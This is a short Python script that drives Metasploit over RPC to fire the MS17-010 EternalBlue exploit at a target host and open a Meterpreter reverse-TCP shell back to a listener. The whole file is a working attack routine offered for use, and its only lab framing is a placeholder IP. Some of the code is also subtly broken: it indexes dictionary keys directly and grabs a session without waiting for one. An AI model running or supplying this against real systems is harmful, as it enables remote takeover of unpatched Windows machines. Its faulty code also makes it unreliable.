from metasploit.msfrpc import MsfRpcClient

def meterpreter_session(rhost, rport, payload='windows/meterpreter/reverse_tcp', lhost='your_lab_ip', lport=4444):
    client = MsfRpcClient('msf_password')  # Connect to running msfconsole
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')  # Or your vuln
    exploit['RHOSTS'] = rhost
    exploit['RPORT'] = rport
    payload_mod = client.modules.use('payload', payload)
    payload_mod['LHOST'] = lhost
    payload_mod['LPORT'] = lport
    job_id = exploit.execute(payload=payload_mod)
    session_id = client.sessions.list.keys()[0]  # Get first session
    shell = client.sessions.session(session_id)
    return shell  # Use shell.run('sysinfo') for interaction